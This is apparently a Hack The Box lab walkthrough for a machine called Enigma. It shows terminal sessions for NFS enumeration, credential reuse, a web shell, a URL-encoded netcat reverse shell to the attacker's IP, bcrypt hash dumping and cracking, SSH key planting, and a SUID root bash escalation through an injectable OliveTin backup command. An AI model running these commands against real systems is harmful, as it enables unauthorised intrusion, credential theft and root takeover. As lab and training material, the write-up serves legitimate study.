

### Initial access

```
┌──(kali㉿kali)-[~/HTB/Enigma]
└─$ showmount -e  10.129.239.191
Export list for 10.129.239.191:
/srv/nfs/onboarding *
                                                                                                                                                  
┌──(kali㉿kali)-[~/HTB/Enigma]
└─$ ls /srv/nfs/onboarding               
ls: cannot access '/srv/nfs/onboarding': No such file or directory
                                                                                                                                                  
┌──(kali㉿kali)-[~/HTB/Enigma]
└─$ sudo mkdir /mnt/nfs_onboarding

                                                                                                                                                  
┌──(kali㉿kali)-[~/HTB/Enigma]
└─$ sudo mount -t nfs 10.129.239.191:/srv/nfs/onboarding /mnt/nfs_onboarding


```
We will have mail web cred
`kevin:Enigma2024!`
after read the mail reuse cred with sarah `sarah:Enigma2024!`

We have new cred in new website `admin:Ne3s4rtars78s`
using https://github.com/advisories/GHSA-25fp-8w8p-mx36 this to get revshell


```
┌──(kali㉿kali)-[~/HTB/Enigma]
└─$ curl http://support_001.enigma.htb/files/SHELL.php?c=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
                                                        
                                                        ┌──(kali㉿kali)-[~/HTB/Enigma]
└─$ curl "http://support_001.enigma.htb/files/SHELL.php?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.15.143%20443%20%3E%2Ftmp%2Ff"


┌──(kali㉿kali)-[~/HTB/Enigma]
└─$ rlwrap nc -lvnp 443  
listening on [any] 443 ...
connect to [10.10.15.143] from (UNKNOWN) [10.129.239.191] 36272
bash: cannot set terminal process group (1429): Inappropriate ioctl for device
bash: no job control in this shell
www-data@enigma:~/html/openstamanager/files$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@enigma:~/html/openstamanager/files$ 


```
### Lateral Movement
DB password
`Fri3nds@9099`  `roundcube:Yo270x26!gTx02`

```
www-data@enigma:/$ mysql -u brollin -p'Fri3nds@9099'
mysql -u brollin -p'Fri3nds@9099'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 138
Server version: 8.0.46-0ubuntu0.24.04.3 (Ubuntu)

Copyright (c) 2000, 2026, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql> DESCRIBE zz_users;

DESCRIBE zz_users;
+---------------+--------------+------+-----+-------------------+-----------------------------------------------+
| Field         | Type         | Null | Key | Default           | Extra                                         |
+---------------+--------------+------+-----+-------------------+-----------------------------------------------+
| id            | int          | NO   | PRI | NULL              | auto_increment                                |
| username      | varchar(150) | NO   | UNI | NULL              |                                               |
| password      | varchar(255) | NO   |     | NULL              |                                               |
| email         | varchar(50)  | NO   |     | NULL              |                                               |
| idanagrafica  | int          | NO   |     | NULL              |                                               |
| idgruppo      | int          | NO   | MUL | NULL              |                                               |
| enabled       | tinyint(1)   | NO   |     | NULL              |                                               |
| created_at    | timestamp    | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED                             |
| updated_at    | timestamp    | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED on update CURRENT_TIMESTAMP |
| reset_token   | varchar(255) | YES  |     | NULL              |                                               |
| image_file_id | int          | YES  |     | NULL              |                                               |
| options       | text         | NO   |     | NULL              |                                               |
+---------------+--------------+------+-----+-------------------+-----------------------------------------------+
12 rows in set (0.01 sec)

mysql> SELECT username, password, email, enabled FROM zz_users;

SELECT username, password, email, enabled FROM zz_users;
+----------+--------------------------------------------------------------+------------------+---------+
| username | password                                                     | email            | enabled |
+----------+--------------------------------------------------------------+------------------+---------+
| admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |       1 |
| haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb |       1 |
+----------+--------------------------------------------------------------+------------------+---------+
2 rows in set (0.00 sec)

```

We cracking haris password
```
┌──(kali㉿kali)-[~/HTB/Enigma]
└─$ echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > haris.hash
                                                              
┌──(kali㉿kali)-[~/HTB/Enigma]
└─$ john  --wordlist=/usr/share/wordlists/rockyou.txt haris.hash                    
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bestfriends      (?)     
1g 0:00:00:01 DONE (2026-09-01 10:07) 0.5494g/s 395.6p/s 395.6c/s 395.6C/s gloria..marissa
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
 
haris@enigma:~$ ls
ls
mail  user.txt
haris@enigma:~$ cat user.txt
cat user.txt
08ba0d213762961879e7ae207c892a81

                 
```

### Priv escalation

Run pspy whe see weird binary
```
2026/09/01 14:47:55 CMD: UID=0    PID=1563   | /usr/sbin/cron -f -P 
2026/09/01 14:47:55 CMD: UID=0    PID=1562   | /usr/sbin/rpc.idmapd 
2026/09/01 14:47:55 CMD: UID=0    PID=1554   | /usr/sbin/dovecot -F 
2026/09/01 14:47:55 CMD: UID=0    PID=1553   | /usr/local/bin/OliveTin 
2026/09/01 14:47:55 CMD: UID=0    PID=15     | 

```
Create ssh access for user haris and ssh tunneling to app running local in port 1337
```
haris@enigma:~$ mkdir -p /home/haris/.ssh
chmod 700 /home/haris/.ssh

mkdir -p /home/haris/.ssh
haris@enigma:~$ chmod 700 /home/haris/.ssh
haris@enigma:~$ 
haris@enigma:~$ ssh-keygen -t rsa -b 3072 -f /home/haris/.ssh/id_rsa -N "" -q

ssh-keygen -t rsa -b 3072 -f /home/haris/.ssh/id_rsa -N "" -q
haris@enigma:~/.ssh$ cat /home/haris/.ssh/id_rsa.pub >> /home/haris/.ssh/authorized_keys
chmod 600 /home/haris/.ssh/authorized_keys
chmod 700 /home/haris/.ssh

<.ssh/id_rsa.pub >> /home/haris/.ssh/authorized_keys
haris@enigma:~/.ssh$ chmod 600 /home/haris/.ssh/authorized_keys
haris@enigma:~/.ssh$ chmod 700 /home/haris/.ssh
ssh -L 1337:127.0.0.1:1337 haris@10.129.37.237 -i id_rsa
```
We read /etc/OliveTin/config.yaml and find injectiont point in db_pass
```
 be used
# in your configuration as variables. For example; `container.status`,
# or `vm.hostname`.
#
# Docs: https://docs.olivetin.app/entities/intro.html
  - title: Backup Database
    id: backup_database
    icon: "⛁"
    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
    popupOnStart: execution-dialog
    arguments:
      - name: db_user
        type: ascii_identifier
        default: backup_svc
      - name: db_pass
        type: password
      - name: db_name
        type: ascii_identifier
        default: production

```


![[Assets/Pasted image 20260901235448.png]]

Create bash file with root suid

```
haris@enigma:~$ cat << 'EOF' > /tmp/backupScript.sh
#!/bin/bash
# Copy file bash hệ thống vào thư mục home của haris
cp /bin/bash /home/haris/.root_shell

# Thiết lập quyền sở hữu thuộc về root
chown root:root /home/haris/.root_shell

# Cấp quyền SUID (u+s) để bất kỳ ai chạy file này cũng sẽ nhận quyền của chủ sở hữu (root)
chmod 4755 /home/haris/.root_shell
EOF
chmod +x /tmp/backupScript.sh
haris@enigma:~$ ls
linpeas.sh  linpeas.txt  mail  user.txt
haris@enigma:~$ ls -la /home/haris/.root_shell
-rwsr-xr-x 1 root root 1446024 Sep  1 16:47 /home/haris/.root_shell
haris@enigma:~$ /home/haris/.root_shell -p
.root_shell-5.2# id
uid=1000(haris) gid=1000(haris) euid=0(root) groups=1000(haris),100(users)
.root_shell-5.2# 

.root_shell-5.2# cat root.txt
581b5b6daadbd6157c79839a929bd512

```

